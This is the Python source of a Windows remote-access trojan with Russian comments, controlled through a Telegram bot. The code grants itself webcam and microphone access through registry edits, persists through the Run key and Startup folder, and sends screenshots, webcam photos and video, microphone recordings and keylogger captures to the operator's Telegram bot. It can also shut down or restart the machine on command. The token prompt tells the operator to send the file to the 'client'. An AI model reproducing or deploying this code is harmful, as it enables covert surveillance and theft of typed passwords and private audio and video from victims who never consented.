import os
import sys
import time
import threading
import winreg as reg
import pyautogui
import psutil
import cv2
import numpy as np
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from pynput import keyboard as kb
import wave
import pyaudio
import lameenc
import traceback
import io
import zipfile
import platform
import tkinter as tk
from tkinter import messagebox

# === Конфиг ===
TOKEN = ""  # Будет заполнен после ввода
PASSWORD = "1717"

# === Переменные ===
keylogger_active = False
keylogger_data = ""
keylogger_lock = threading.Lock()
webcam_recording = False
lock_event = threading.Event()


# === Сохранить токен в этот же файл ===
def save_token_to_self(token):
    file_path = __file__
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        token_found = False
        for i, line in enumerate(lines):
            if line.strip().startswith("TOKEN = "):
                lines[i] = f'TOKEN = "{token}"\n'
                token_found = True
                break

        if not token_found:
            messagebox.showerror("Ошибка", "Строка TOKEN = ... не найдена.")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        messagebox.showinfo("✅ Успех", "Токен сохранён! Перезапустите программу.")
        return True
    except Exception as e:
        messagebox.showerror("❌ Ошибка", f"Не удалось сохранить:\n{str(e)}")
        return False


# === GUI: окно с возможностью вставить токен (Ctrl+V) ===
def show_token_input():
    root = tk.Tk()
    root.title("🔐 Введите токен бота")
    root.geometry("420x220")
    root.resizable(False, False)
    root.attributes("-topmost", True)

    tk.Label(
        root,
        text="Введите токен Telegram-бота:",
        font=("Arial", 10)
    ).pack(pady=10)

    entry = tk.Entry(root, width=50, font=("Arial", 9))
    entry.pack(pady=5)

    tk.Label(
        root,
        text="Отправьте этот файл клиенту.\n"
             "Управление — через Telegram.",
        font=("Arial", 9), fg="gray"
    ).pack(pady=10)

    # Вставка через Ctrl+V
    def on_paste(event):
        try:
            # Вставляем из буфера
            root.clipboard_update()
            text = root.clipboard_get()
            entry.insert("insert", text)
            return "break"  # блокируем стандартное поведение
        except tk.TclError:
            messagebox.showwarning("⚠️ Буфер пуст", "Буфер обмена пуст или содержит не текст.")
            return "break"

    # Разрешаем вставку
    entry.bind("<Control-v>", on_paste)
    entry.bind("<Button-3>", on_paste)  # ПКМ
    entry.focus()

    def on_submit():
        token = entry.get().strip()
        if not token:
            messagebox.showwarning("Пусто", "Введите токен!")
            return
        if ":" not in token or not token.split(":")[0].isdigit():
            messagebox.showwarning("Неверный формат", "Это не токен бота.")
            return
        if save_token_to_self(token):
            root.destroy()
            sys.exit(0)

    tk.Button(
        root,
        text="Сохранить и выйти",
        command=on_submit,
        bg="#4CAF50", fg="white",
        font=("Arial", 10), padx=10, pady=5
    ).pack(pady=10)

    root.mainloop()


# === Проверка: если токен пуст — показать окно ===
if __name__ == "__main__":
    if TOKEN == "":
        show_token_input()


# === Разрешить доступ к камере и микрофону ===
def grant_privacy_access():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Value", 0, reg.REG_SZ, "Allow")
        reg.CloseKey(key)
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Value", 0, reg.REG_SZ, "Allow")
        reg.CloseKey(key)
    except Exception as e:
        print("Ошибка доступа:", e)


# === Автозагрузка ===
def add_to_startup():
    try:
        current_path = sys.argv[0]
        if getattr(sys, 'frozen', False):
            target_path = sys.executable
        else:
            target_path = os.path.join(os.path.dirname(current_path), "client.exe")
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "ClientBot", 0, reg.REG_SZ, f'"{target_path}"')
        reg.CloseKey(key)
        username = os.getenv("USERNAME")
        startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        startup_exe = os.path.join(startup_dir, "client.exe")
        if not os.path.exists(startup_exe):
            import shutil
            shutil.copy(target_path, startup_exe)
            print(f"[+] В автозагрузке: {startup_exe}")
    except Exception as e:
        print("Ошибка автозагрузки:", e)


# === Отправка сообщений ===
def send_message(update, context, text=None, reply_markup=None, parse_mode=None):
    try:
        if update.message:
            return update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        elif update.callback_query:
            return update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        print("Ошибка отправки:", e)


def send_photo(update, context, buffer, caption=""):
    try:
        if update.message:
            update.message.reply_photo(photo=InputFile(buffer), caption=caption)
        elif update.callback_query:
            update.callback_query.message.reply_photo(photo=InputFile(buffer), caption=caption)
    except Exception as e:
        send_message(update, context, f"❌ Ошибка фото: {str(e)}")


# === Обработчики команд ===
def safe_run(func):
    def wrapper(update, context):
        try:
            return func(update, context)
        except Exception as e:
            print("Ошибка:", e)
            traceback.print_exc()
            send_message(update, context, "❌ Ошибка.")
    return wrapper


@safe_run
def start(update, context):
    send_message(update, context, "Выберите команду:", reply_markup=start_keyboard())


@safe_run
def screenshot(update, context):
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    buf.seek(0)
    send_photo(update, context, buf, "📸 Скриншот")


@safe_run
def webcam(update, context):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        send_message(update, context, "❌ Нет доступа к камере.")
        return
    ret, frame = cap.read()
    cap.release()
    if not ret:
        send_message(update, context, "❌ Ошибка фото.")
        return
    success, data = cv2.imencode(".jpg", frame)
    if not success:
        send_message(update, context, "❌ Ошибка кодирования.")
        return
    buf = io.BytesIO(data)
    buf.seek(0)
    send_photo(update, context, buf, "📷 Фото с вебки")


@safe_run
def stats(update, context):
    uptime = time.time() - start_time
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    battery = psutil.sensors_battery()
    bat_str = f"{battery.percent}%" if battery else "Нет"
    text = (
        f"📊 Статистика:\n"
        f"Uptime: {time.strftime('%H:%M:%S', time.gmtime(uptime))}\n"
        f"CPU: {cpu}%\n"
        f"Память: {mem}%\n"
        f"Диск: {disk}%\n"
        f"ОС: {platform.version()}\n"
        f"Батарея: {bat_str}"
    )
    send_message(update, context, text)


# === Кейлоггер ===
@safe_run
def start_keylogger(update, context):
    global keylogger_active, keylogger_data
    if keylogger_active:
        send_message(update, context, "⚠️ Уже запущен.")
        return
    keylogger_data = ""
    keylogger_active = True
    send_message(update, context, "🟢 Кейлоггер запущен (60 сек)...")
    def listener():
        with kb.Listener(on_press=on_press) as l:
            l.join()
    threading.Thread(target=listener, daemon=True).start()

    def stopper():
        time.sleep(60)
        global keylogger_active
        keylogger_active = False
        if keylogger_data.strip():
            send_message(update, context, f"📝 Лог:\n```\n{keylogger_data}\n```", parse_mode='Markdown')
        else:
            send_message(update, context, "📝 Ничего не набрано.")
    threading.Thread(target=stopper, daemon=True).start()


def on_press(key):
    global keylogger_active, keylogger_data
    if not keylogger_active:
        return False
    try:
        with keylogger_lock:
            keylogger_data += key.char
    except AttributeError:
        if key == kb.Key.space:
            with keylogger_lock:
                keylogger_data += " "
        elif key == kb.Key.enter:
            with keylogger_lock:
                keylogger_data += "\n"
        elif key == kb.Key.backspace:
            with keylogger_lock:
                keylogger_data = keylogger_data[:-1]
        else:
            with keylogger_lock:
                keylogger_data += f" [{key}] "


# === Аудио ===
def record_microphone(output_wav="output.wav", duration=5, rate=44100, chunk=1024):
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=rate, input=True, frames_per_buffer=chunk)
        frames = [stream.read(chunk) for _ in range(0, int(rate / chunk * duration))]
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(output_wav, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
    except Exception as e:
        print("Ошибка аудио:", e)


def wav_to_mp3(wav_path, mp3_path, bitrate=64):
    try:
        with open(wav_path, 'rb') as f:
            wav_data = f.read()
        audio_data = bytearray(wav_data[0x2C:])
        encoder = lameenc.Encoder()
        encoder.set_bit_rate(bitrate)
        encoder.set_in_sample_rate(44100)
        encoder.set_channels(1)
        encoder.set_quality(2)
        mp3_data = encoder.encode(bytes(audio_data)) + encoder.flush()
        with open(mp3_path, 'wb') as f:
            f.write(mp3_data)
        os.remove(wav_path)
    except Exception as e:
        print("Ошибка конвертации:", e)


@safe_run
def record_audio_command(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "❌ /recordaudio <сек> (до 60)")
        return
    duration = min(int(args[0]), 60)
    send_message(update, context, f"🎙️ Запись {duration} сек...")
    record_microphone("output.wav", duration)
    if not os.path.exists("output.wav"):
        send_message(update, context, "❌ Ошибка записи.")
        return
    wav_to_mp3("output.wav", "output.mp3")
    if not os.path.exists("output.mp3"):
        send_message(update, context, "❌ Ошибка MP3.")
        return
    size = os.path.getsize("output.mp3") / 1024 / 1024
    with open("output.mp3", 'rb') as f:
        send_document(update, context, f, f"🎙️ Аудио (~{int(size)} MB)")
    os.remove("output.mp3")


# === Видео ===
def record_webcam_video(duration=10, filename="webcam.avi", res=(640, 480), fps=15):
    global webcam_recording
    if webcam_recording: return None
    webcam_recording = True
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return None
    out = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'XVID'), fps, res)
    start = time.time()
    while time.time() - start < duration:
        ret, frame = cap.read()
        if ret: out.write(frame)
        else: break
    cap.release()
    out.release()
    webcam_recording = False
    return filename


@safe_run
def send_webcam_video(update, context):
    args = context.args
    if not args or not args[0].isdigit():
        send_message(update, context, "❌ /recordvideo <сек> (до 30)")
        return
    duration = min(int(args[0]), 30)
    send_message(update, context, f"🎥 Запись {duration} сек...")
    file = record_webcam_video(duration)
    if not file or not os.path.exists(file):
        send_message(update, context, "❌ Ошибка видео.")
        return
    size = os.path.getsize(file) / 1024 / 1024
    if size > 50:
        zip_file = compress_to_zip(file, "webcam.zip")
        os.remove(file)
        with open(zip_file, 'rb') as f:
            send_document(update, context, f, "📁 Видео (архив)")
        os.remove(zip_file)
    else:
        with open(file, 'rb') as f:
            send_document(update, context, f, f"🎥 Видео (~{int(size)} MB)")
        os.remove(file)


# === Утилиты ===
def compress_to_zip(file, zip_name="output.zip"):
    with zipfile.ZipFile(zip_name, 'w') as z:
        z.write(file, os.path.basename(file))
    return zip_name


def send_document(update, context, file, caption=""):
    if update.message:
        update.message.reply_document(document=file, caption=caption)
    elif update.callback_query:
        update.callback_query.message.reply_document(document=file, caption=caption)


# === Кнопки ===
def start_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
        [InlineKeyboardButton("📷 Веб-камера", callback_data='webcam')],
        [InlineKeyboardButton("🎙️ Аудио", callback_data='recordaudio')],
        [InlineKeyboardButton("🎥 Видео с вебки", callback_data='recordvideo')],
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("⌨️ Кейлоггер", callback_data='keylogger')],
        [InlineKeyboardButton("🔒 Заблокировать", callback_data='lock')],
        [InlineKeyboardButton("🔓 Разблокировать", callback_data='unlock')],
        [InlineKeyboardButton("⏻ Выкл", callback_data='shutdown')],
        [InlineKeyboardButton("🔁 Перезагрузка", callback_data='restart')],
    ])


# === Обработка кнопок ===
def button_handler(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if lock_event.is_set() and not data.startswith('unlock'):
        query.edit_message_text("❌ Клиент заблокирован.")
        return
    if data == 'screenshot':
        threading.Thread(target=screenshot, args=(update, context), daemon=True).start()
    elif data == 'webcam':
        threading.Thread(target=webcam, args=(update, context), daemon=True).start()
    elif data == 'stats':
        threading.Thread(target=stats, args=(update, context), daemon=True).start()
    elif data == 'keylogger':
        threading.Thread(target=start_keylogger, args=(update, context), daemon=True).start()
    elif data == 'recordaudio':
        send_message(update, context, "Введите: /recordaudio <сек>")
    elif data == 'recordvideo':
        send_message(update, context, "Введите: /recordvideo <сек>")
    elif data == 'lock':
        lock_screen()
        query.edit_message_text("🔒 Заблокирован.")
    elif data == 'unlock':
        query.edit_message_text("Введите /unlock <пароль>")
    elif data == 'shutdown':
        query.edit_message_text("⏻ Выключаю...")
        os.system("shutdown /s /t 1")
    elif data == 'restart':
        query.edit_message_text("🔁 Перезагружаюсь...")
        os.system("shutdown /r /t 1")


# === Блокировка ===
def lock_screen():
    lock_event.set()

def unlock_screen():
    lock_event.clear()


# === Бот ===
def bot_loop():
    while True:
        try:
            updater = Updater(TOKEN, use_context=True)
            dp = updater.dispatcher
            dp.add_handler(CommandHandler("start", start))
            dp.add_handler(CommandHandler("screenshot", screenshot))
            dp.add_handler(CommandHandler("webcam", webcam))
            dp.add_handler(CommandHandler("stats", stats))
            dp.add_handler(CommandHandler("startlog", start_keylogger))
            dp.add_handler(CommandHandler("recordaudio", record_audio_command))
            dp.add_handler(CommandHandler("recordvideo", send_webcam_video))
            dp.add_handler(CallbackQueryHandler(button_handler))
            updater.start_polling()
            updater.idle()
        except Exception as e:
            print("Ошибка! Перезапуск...")
            time.sleep(3)


# === Защита от дублей ===
def single_instance():
    try:
        from ctypes import windll
        mutex = windll.kernel32.CreateMutexW(None, False, "MyUniqueAppMutex")
        if windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except Exception:
        pass


# === Запуск ===
if __name__ == "__main__":
    start_time = time.time()
    single_instance()
    grant_privacy_access()
    add_to_startup()
    bot_loop()